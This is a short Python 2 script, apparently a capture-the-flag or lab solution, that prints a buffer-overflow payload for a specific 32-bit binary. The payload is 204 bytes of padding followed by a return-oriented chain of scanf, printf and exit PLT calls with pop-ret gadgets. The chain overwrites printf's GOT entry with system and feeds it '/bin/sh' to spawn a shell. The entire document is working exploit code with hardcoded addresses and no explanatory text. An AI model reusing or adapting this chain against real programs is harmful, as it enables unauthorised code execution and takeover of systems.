
plt_printf = "\x40\x83\x04\x08"
plt_exit = "\x50\x83\x04\x08"
plt_scanf = "\x70\x83\x04\x08"

arg_bufaddr = "\x28\xa0\x04\x08" 
arg_fmstr = "\x6e\x85\x04\x08"

arg_status = "\x01\x00\x00\x00"

gaddr_ppr = "\x3a\x85\x04\x08"
gaddr_pr = "\x56\x85\x04\x08"

got_printf = "\x08\xa0\x04\x08" #"\x0c\xa0\x04\x08"

strend = "\n"
faddr_system = "\x1f\xe0\xfe\xf7" + "\xa0\xbd\xe3\xf7" + "\x56\x83\x04\x08"


ex = "A"*200 + "B"*4 \
	+ plt_scanf + gaddr_ppr + arg_fmstr + got_printf \
	+ plt_scanf + gaddr_ppr + arg_fmstr + arg_bufaddr \
	+ plt_printf + gaddr_pr + arg_bufaddr \
	+ plt_exit + arg_status \
	+ strend + faddr_system \
	+ strend + "/bin/sh"

print ex





